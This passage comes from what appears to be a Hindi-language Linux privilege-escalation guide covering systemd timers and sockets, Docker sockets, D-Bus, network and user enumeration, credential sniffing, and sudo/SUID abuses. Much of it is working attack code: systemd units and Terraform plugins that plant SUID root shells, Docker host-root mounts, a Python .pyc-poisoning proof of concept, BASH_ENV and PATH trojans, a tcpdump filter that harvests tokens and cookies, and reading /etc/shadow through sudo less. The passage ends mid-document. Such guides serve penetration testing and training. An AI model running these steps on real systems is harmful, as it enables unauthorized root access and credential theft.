फिर, उस **relative path binary** के **same name** वाला एक **executable** उस systemd PATH folder के अंदर बनाएँ, जिसमें आप लिख सकते हैं, और जब service से vulnerable action (**Start**, **Stop**, **Reload**) execute करने के लिए कहा जाता है, तो आपका **backdoor execute** हो जाएगा (unprivileged users आमतौर पर services को start/stop नहीं कर सकते, लेकिन जाँचें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**`man systemd.service` से services के बारे में अधिक जानें।**

## **Timers**

**Timers** systemd unit files होती हैं, जिनके नाम का अंत `**.timer**` से होता है और जो `**.service**` files या events को control करती हैं। **Timers** को cron के विकल्प के रूप में उपयोग किया जा सकता है, क्योंकि इनमें calendar time events और monotonic time events के लिए built-in support होता है और इन्हें asynchronously run किया जा सकता है।

आप सभी timers को इस command से enumerate कर सकते हैं:
```bash
systemctl list-timers --all
```
### Writable timers

यदि आप किसी timer को modify कर सकते हैं, तो आप उसे `systemd.unit` के कुछ entities (जैसे `.service` या `.target`) execute करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
Documentation में आप पढ़ सकते हैं कि Unit क्या है:

> इस Timer के समाप्त होने पर सक्रिय की जाने वाली Unit। यह argument एक unit name है, जिसका suffix ".timer" नहीं होता। यदि निर्दिष्ट नहीं किया गया है, तो यह value उस service पर default होती है जिसका नाम timer unit के समान होता है, suffix को छोड़कर। (ऊपर देखें।) यह recommended है कि सक्रिय की जाने वाली unit का नाम और timer unit का नाम suffix को छोड़कर समान रखा जाए।

इसलिए, इस permission का दुरुपयोग करने के लिए आपको यह करना होगा:

- ऐसी systemd unit (जैसे `.service`) खोजें जो **किसी writable binary को execute कर रही हो**
- ऐसी systemd unit खोजें जो **relative path को execute कर रही हो** और आपके पास **systemd PATH** पर **writable privileges** हों (ताकि उस executable का impersonate किया जा सके)

**`man systemd.timer` के साथ timers के बारे में अधिक जानें।**

### **Timer सक्षम करना**

Timer को सक्षम करने के लिए आपको root privileges और यह command execute करने की आवश्यकता है:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
ध्यान दें कि **timer** `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` पर एक symlink बनाकर **activated** होता है।

## Sockets

Unix Domain Sockets (UDS) client-server models के भीतर एक ही या अलग-अलग machines पर **process communication** सक्षम करते हैं। वे inter-computer communication के लिए standard Unix descriptor files का उपयोग करते हैं और `.socket` files के माध्यम से setup किए जाते हैं।

Sockets को `.socket` files का उपयोग करके configure किया जा सकता है।

**Sockets के बारे में `man systemd.socket` से अधिक जानें।** इस file के भीतर कई interesting parameters configure किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये options अलग-अलग हैं, लेकिन एक summary का उपयोग **यह बताने के लिए किया जाता है कि यह कहाँ listen करेगा** (AF_UNIX socket file का path, listen करने के लिए IPv4/6 और/या port number, आदि)।
- `Accept`: एक boolean argument लेता है। यदि **true** है, तो **प्रत्येक incoming connection के लिए एक service instance spawn किया जाता है** और केवल connection socket उसे दिया जाता है। यदि **false** है, तो सभी listening sockets स्वयं **started service unit को दिए जाते हैं**, और सभी connections के लिए केवल एक service unit spawn किया जाता है। Datagram sockets और FIFOs के लिए यह value ignore की जाती है, जहाँ एक single service unit बिना किसी शर्त के सभी incoming traffic handle करता है। **Default false है**। Performance कारणों से, नए daemons को केवल इस प्रकार लिखने की recommendation दी जाती है कि वे `Accept=no` के लिए suitable हों।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेते हैं, जिन्हें listening **sockets**/FIFOs के **create** और bind होने से **पहले** या **बाद** क्रमशः **execute** किया जाता है। Command line का पहला token एक absolute filename होना चाहिए, जिसके बाद process के arguments आते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जिन्हें listening **sockets**/FIFOs के **close** और remove होने से **पहले** या **बाद** क्रमशः **execute** किया जाता है।
- `Service`: **incoming traffic** पर **activate** की जाने वाली **service** unit का नाम specify करता है। यह setting केवल Accept=no वाले sockets के लिए allowed है। इसका default वही service होता है जिसका नाम socket के समान होता है (suffix को replace करने के बाद)। अधिकांश मामलों में, इस option का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

यदि आपको कोई **writable** `.socket` file मिलती है, तो आप `[Socket]` section की शुरुआत में इस तरह कुछ **add** कर सकते हैं: `ExecStartPre=/home/kali/sys/backdoor`, और socket create होने से पहले backdoor execute किया जाएगा। इसलिए, आपको **संभवतः machine के reboot होने तक wait करना पड़ेगा।**\
_ध्यान दें कि system को उस socket file configuration का उपयोग करना चाहिए, अन्यथा backdoor execute नहीं होगा_

### Socket activation + writable unit path (create missing service)

एक अन्य high-impact misconfiguration है:

- `Accept=no` और `Service=<name>.service` वाली socket unit
- referenced service unit missing है
- attacker `/etc/systemd/system` (या किसी अन्य unit search path) में write कर सकता है

ऐसी स्थिति में, attacker `<name>.service` create कर सकता है, फिर socket पर traffic trigger कर सकता है ताकि systemd नई service को root के रूप में load और execute करे।

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Writable sockets

यदि आप **कोई writable socket identify करते हैं** (_अब हम Unix Sockets की बात कर रहे हैं, config `.socket` files की नहीं_), तो **आप उस socket के साथ communicate** कर सकते हैं और शायद किसी vulnerability को exploit कर सकते हैं।

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Raw connection
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **HTTP requests के लिए listening sockets** हो सकते हैं (_मैं .socket files की बात नहीं कर रहा हूँ, बल्कि उन files की बात कर रहा हूँ जो Unix sockets के रूप में काम करती हैं_)। आप इसे इस तरह जाँच सकते हैं:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
यदि socket **HTTP** request के साथ **respond** करता है, तो आप इसके साथ **communicate** कर सकते हैं और संभवतः **किसी vulnerability को exploit** कर सकते हैं।

### Writable Docker Socket

Docker socket, जो अक्सर `/var/run/docker.sock` पर पाया जाता है, एक critical file है जिसे सुरक्षित रखा जाना चाहिए। डिफ़ॉल्ट रूप से, यह `root` user और `docker` group के members द्वारा writable होता है। इस socket पर write access होने से privilege escalation हो सकता है। इसे कैसे किया जा सकता है और Docker CLI उपलब्ध न होने पर वैकल्पिक methods क्या हैं, इसका विवरण नीचे दिया गया है।

#### **Docker CLI के साथ Privilege Escalation**

यदि आपके पास Docker socket पर write access है, तो आप निम्नलिखित commands का उपयोग करके privileges escalate कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये commands आपको host के file system पर root-level access के साथ container चलाने की अनुमति देते हैं।

#### **Docker API Directly का उपयोग**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध नहीं है, Docker socket को Docker API और `curl` commands का उपयोग करके manipulate किया जा सकता है।

1.  **Docker Images की सूची बनाएँ:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **एक Container बनाएँ:** ऐसा container बनाने के लिए request भेजें जो host system की root directory को mount करता हो।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

नए बनाए गए container को start करें:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Container से Attach करें:** container से connection स्थापित करने के लिए `socat` का उपयोग करें, जिससे उसके अंदर commands execute की जा सकें।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`​socat` connection सेट करने के बाद, आप host के filesystem पर root-level access के साथ container में सीधे commands execute कर सकते हैं।

### अन्य

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **`docker` group के अंदर हैं**, तो आपके पास [**privileges escalate करने के और तरीके**](../../user-information/interesting-groups-linux-pe/index.html#docker-group) हैं। यदि [**docker API किसी port पर listening कर रही है**, तो आप इसे compromise भी कर सकते हैं](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

**Containers से break out करने या privileges escalate करने के लिए container runtimes का दुरुपयोग करने के और तरीके** यहाँ देखें:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आपको पता चलता है कि आप **`ctr`** command का उपयोग कर सकते हैं, तो निम्न page पढ़ें, क्योंकि **आप privileges escalate करने के लिए इसका दुरुपयोग कर सकते हैं**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आपको पता चलता है कि आप **`runc`** command का उपयोग कर सकते हैं, तो निम्न page पढ़ें, क्योंकि **आप privileges escalate करने के लिए इसका दुरुपयोग कर सकते हैं**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक sophisticated **inter-Process Communication (IPC) system** है, जो applications को प्रभावी ढंग से interact करने और data share करने में सक्षम बनाता है। आधुनिक Linux system को ध्यान में रखकर design किया गया यह विभिन्न प्रकार के application communication के लिए एक मजबूत framework प्रदान करता है।

यह system versatile है और basic IPC को support करता है, जो processes के बीच data exchange को बेहतर बनाता है और **enhanced UNIX domain sockets** जैसा है। इसके अतिरिक्त, यह events या signals को broadcast करने में सहायता करता है, जिससे system components के बीच seamless integration संभव होता है। उदाहरण के लिए, incoming call के बारे में Bluetooth daemon से signal मिलने पर music player mute हो सकता है, जिससे user experience बेहतर होता है। इसके अलावा, D-Bus एक remote object system को support करता है, जो applications के बीच service requests और method invocations को सरल बनाता है तथा उन processes को streamline करता है जो पारंपरिक रूप से complex थे।

D-Bus एक **allow/deny model** पर operate करता है और matching policy rules के cumulative effect के आधार पर message permissions (method calls, signal emissions आदि) manage करता है। ये policies bus के साथ होने वाले interactions को specify करती हैं और इन permissions के exploitation के माध्यम से privilege escalation की संभावना हो सकती है।

ऐसी policy का एक उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है, जिसमें root user के लिए `fi.w1.wpa_supplicant1` से messages own करने, भेजने और receive करने की permissions का विवरण है।

बिना specified user या group वाली policies सार्वभौमिक रूप से लागू होती हैं, जबकि "default" context policies उन सभी पर लागू होती हैं जिन्हें अन्य specific policies द्वारा cover नहीं किया गया है।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ D-Bus communication को enumerate और exploit करना सीखें:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

मशीन के network को enumerate करना और उसकी स्थिति का पता लगाना हमेशा रोचक होता है।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Outbound filtering quick triage

यदि host commands चला सकता है लेकिन callbacks विफल होते हैं, तो DNS, transport, proxy और route filtering को जल्दी से अलग-अलग जांचें:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### खुले पोर्ट

मशीन तक पहुंचने से पहले हमेशा उन नेटवर्क सेवाओं की जांच करें, जिनसे आप पहले interact नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Listeners को bind target के आधार पर वर्गीकृत करें:

- `0.0.0.0` / `[::]`: सभी local interfaces पर exposed।
- `127.0.0.1` / `::1`: केवल local (अच्छे tunnel/forward candidates)।
- Specific internal IPs (जैसे `10.x`, `172.16/12`, `192.168.x`, `fe80::`): आमतौर पर केवल internal segments से reachable।

### Local-only service triage workflow

जब आप किसी host को compromise करते हैं, तो `127.0.0.1` से bound services अक्सर पहली बार आपके shell से reachable हो जाती हैं। एक quick local workflow यह है:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS एक network scanner के रूप में (केवल network mode)

Local PE checks के अलावा, linPEAS एक focused network scanner के रूप में चल सकता है। यह `$PATH` में उपलब्ध binaries (आमतौर पर `fping`, `ping`, `nc`, `ncat`) का उपयोग करता है और कोई tooling install नहीं करता।
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
यदि आप `-t` के बिना `-d`, `-p`, या `-i` पास करते हैं, तो linPEAS एक pure network scanner की तरह व्यवहार करता है (बाकी privilege-escalation checks को छोड़कर)।

### Sniffing

जाँचें कि क्या आप traffic sniff कर सकते हैं। यदि ऐसा कर सकते हैं, तो आप कुछ credentials grab करने में सक्षम हो सकते हैं।
```
timeout 1 tcpdump
```
त्वरित व्यावहारिक जांच:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) post-exploitation में विशेष रूप से मूल्यवान है क्योंकि कई internal-only services वहाँ tokens/cookies/credentials expose करती हैं:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
अभी Capture करें, बाद में Parse करें:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Users

### Generic Enumeration

जाँचें कि आप **कौन** हैं, आपके पास कौन-से **privileges** हैं, systems में कौन-से **users** हैं, कौन-से **login** कर सकते हैं और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

कुछ Linux versions एक ऐसे bug से प्रभावित थे जो **UID > INT_MAX** वाले users को privileges escalate करने की अनुमति देता है। अधिक जानकारी: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) और [here](https://twitter.com/paragonsec/status/1071152249529884674)।\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

जाँचें कि क्या आप किसी ऐसे **group के member** हैं जो आपको root privileges प्रदान कर सकता है:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

जाँचें कि क्या Clipboard के अंदर कोई interesting चीज़ मौजूद है (यदि संभव हो)।
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात passwords

यदि आपको environment का **कोई password पता है**, तो उस password का उपयोग करके **प्रत्येक user के रूप में login करने का प्रयास करें**।

### Su Brute

यदि आपको बहुत अधिक noise करने में कोई समस्या नहीं है और computer पर `su` तथा `timeout` binaries मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके user को brute-force करने का प्रयास कर सकते हैं।\
`-a` parameter के साथ [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) भी users को brute-force करने का प्रयास करता है।

## Writable PATH abuses

### $PATH

यदि आपको पता चलता है कि आप **$PATH के किसी folder के अंदर write कर सकते हैं**, तो आप **writable folder के अंदर backdoor बनाकर** privileges escalate करने में सक्षम हो सकते हैं। Backdoor का नाम उस command के नाम पर होना चाहिए जिसे कोई दूसरा user (आदर्श रूप से root) execute करने वाला है और जो `$PATH` में आपके writable folder से **पहले स्थित किसी folder से load नहीं होती**।

### SUDO and SUID

आपको sudo का उपयोग करके कोई command execute करने की अनुमति हो सकती है या उस command पर suid bit सेट हो सकती है। इसे इस प्रकार check करें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अनपेक्षित commands आपको files पढ़ने और/या लिखने, या यहाँ तक कि कोई command execute करने की अनुमति देते हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo configuration किसी user को password जाने बिना किसी अन्य user के privileges के साथ कुछ command execute करने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में user `demo`, `vim` को `root` के रूप में चला सकता है। अब root directory में SSH key जोड़कर या `sh` को call करके shell प्राप्त करना आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह directive user को कुछ execute करते समय **environment variable सेट करने** की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer** पर **आधारित**, **PYTHONPATH hijacking** के प्रति **vulnerable** था, जिससे script को root के रूप में execute करते समय arbitrary python library load की जा सकती थी:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### sudo-allowed Python imports में writable `__pycache__` / `.pyc` poisoning

यदि कोई **sudo-allowed Python script** ऐसे module को import करती है जिसके package directory में **writable `__pycache__`** है, तो आप cached `.pyc` को replace करके अगले import पर privileged user के रूप में code execution प्राप्त कर सकते हैं।

- यह क्यों काम करता है:
- CPython bytecode caches को `__pycache__/module.cpython-<ver>.pyc` में store करता है।
- Interpreter **header** (source से जुड़े magic + timestamp/hash metadata) को validate करता है, फिर उस header के बाद stored marshaled code object को execute करता है।
- यदि directory writable होने के कारण आप cached file को **delete और recreate** कर सकते हैं, तो root-owned लेकिन non-writable `.pyc` को भी replace किया जा सकता है।
- सामान्य path:
- `sudo -l` में ऐसी Python script या wrapper दिखाई देती है जिसे आप root के रूप में चला सकते हैं।
- वह script `/opt/app/`, `/usr/local/lib/...` आदि से local module import करती है।
- Imported module की `__pycache__` directory आपके user या सभी users के लिए writable है।

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
यदि आप privileged script का निरीक्षण कर सकते हैं, तो imported modules और उनका cache path पहचानें:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Abuse workflow:

1. `sudo`-allowed script को एक बार चलाएँ ताकि Python वैध cache file बना सके, यदि वह पहले से मौजूद न हो।
2. वैध `.pyc` से पहले 16 bytes पढ़ें और उन्हें poisoned file में पुनः उपयोग करें।
3. एक payload code object compile करें, उसे `marshal.dumps(...)` करें, मूल cache file को हटाएँ, और original header तथा अपने malicious bytecode के साथ उसे फिर से बनाएँ।
4. `sudo`-allowed script को दोबारा चलाएँ ताकि import आपके payload को root के रूप में execute करे।

Important notes:

- Original header का पुनः उपयोग करना महत्वपूर्ण है, क्योंकि Python cache metadata को source file के विरुद्ध जाँचता है, न कि यह कि bytecode body वास्तव में source से मेल खाती है या नहीं।
- यह विशेष रूप से तब उपयोगी है जब source file root-owned हो और writable न हो, लेकिन उसके containing `__pycache__` directory में write permission हो।
- यदि privileged process `PYTHONDONTWRITEBYTECODE=1` का उपयोग करता है, किसी ऐसी location से import करता है जिसकी permissions सुरक्षित हैं, या import path की प्रत्येक directory से write access हटा देता है, तो attack विफल हो जाता है।

Minimal proof-of-concept shape:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- सुनिश्चित करें कि privileged Python import path में कोई भी directory low-privileged users द्वारा writable न हो, इसमें `__pycache__` भी शामिल है।
- Privileged runs के लिए `PYTHONDONTWRITEBYTECODE=1` का उपयोग करने और unexpected writable `__pycache__` directories की periodic checks करने पर विचार करें।
- Writable local Python modules और writable cache directories को उसी तरह treat करें, जैसे root द्वारा execute की जाने वाली writable shell scripts या shared libraries को treat करते हैं।

### sudo env_keep के माध्यम से BASH_ENV संरक्षित → root shell

यदि sudoers `BASH_ENV` को preserve करता है (जैसे, `Defaults env_keep+="ENV BASH_ENV"`), तो allowed command को invoke करते समय arbitrary code को root के रूप में run करने के लिए Bash के non-interactive startup behavior का लाभ उठाया जा सकता है।

- यह क्यों काम करता है: Non-interactive shells के लिए, Bash target script को run करने से पहले `$BASH_ENV` को evaluate करता है और उस file को source करता है। कई sudo rules किसी script या shell wrapper को run करने की अनुमति देते हैं। यदि `BASH_ENV` sudo द्वारा preserve किया जाता है, तो आपकी file root privileges के साथ source की जाती है।

- Requirements:
- ऐसी sudo rule जिसे आप run कर सकें (कोई भी target जो `/bin/bash` को non-interactively invoke करता हो, या कोई भी bash script)।
- `BASH_ENV` का `env_keep` में मौजूद होना (`sudo -l` से check करें)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `env_keep` से `BASH_ENV` (और `ENV`) हटाएँ, `env_reset` को प्राथमिकता दें।
- sudo-अनुमत commands के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
- संरक्षित env vars के उपयोग पर sudo I/O logging और alerting लागू करने पर विचार करें।

### sudo के माध्यम से Terraform, संरक्षित HOME के साथ (!env_reset)

यदि sudo environment को जस का तस रखता है (`!env_reset`) और `terraform apply` की अनुमति देता है, तो `$HOME` calling user का ही रहता है। इसलिए Terraform **$HOME/.terraformrc** को root के रूप में लोड करता है और `provider_installation.dev_overrides` का सम्मान करता है।

- आवश्यक provider को writable directory पर point करें और provider के नाम पर एक malicious plugin drop करें (जैसे, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform Go plugin handshake में fail होगा, लेकिन मरने से पहले payload को root के रूप में execute कर देगा और पीछे एक SUID shell छोड़ देगा।

### TF_VAR overrides + symlink validation bypass

Terraform variables को `TF_VAR_<name>` environment variables के माध्यम से प्रदान किया जा सकता है। जब sudo environment को preserve करता है, तो ये variables बने रहते हैं। `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` जैसे कमजोर validations को symlinks के माध्यम से bypass किया जा सकता है:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform symlink को resolve करता है और वास्तविक `/root/root.txt` को attacker-readable destination में copy करता है। इसी approach का उपयोग privileged paths में **write** करने के लिए भी किया जा सकता है, जिसमें destination symlinks को पहले से बनाया जाता है (जैसे provider के destination path को `/etc/cron.d/` के अंदर point करना)।

### requiretty / !requiretty

कुछ पुराने distributions पर, sudo को `requiretty` के साथ configure किया जा सकता है, जो sudo को केवल एक interactive TTY से चलने के लिए बाध्य करता है। यदि `!requiretty` सेट है (या option मौजूद नहीं है), तो sudo को reverse shells, cron jobs या scripts जैसे non-interactive contexts से execute किया जा सकता है।
```bash
Defaults !requiretty
```
यह अपने आप में कोई direct vulnerability नहीं है, लेकिन यह उन परिस्थितियों का विस्तार करता है जहाँ full PTY की आवश्यकता के बिना sudo rules का abuse किया जा सकता है।

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

यदि `sudo -l` में `env_keep+=PATH` या attacker-writable entries वाली `secure_path` (जैसे, `/home/<user>/bin`) दिखाई देती है, तो sudo-allowed target के अंदर मौजूद कोई भी relative command shadow की जा सकती है।

- आवश्यकताएँ: एक sudo rule (अक्सर `NOPASSWD`) जो ऐसी script/binary चलाता हो और commands को absolute paths के बिना (`free`, `df`, `ps`, आदि) call करता हो, तथा ऐसी writable PATH entry हो जिसे सबसे पहले search किया जाता हो।
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo execution में paths को bypass करना
अन्य files पढ़ने या **symlinks** का उपयोग करने के लिए **Jump** करें। उदाहरण के लिए sudoers file में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
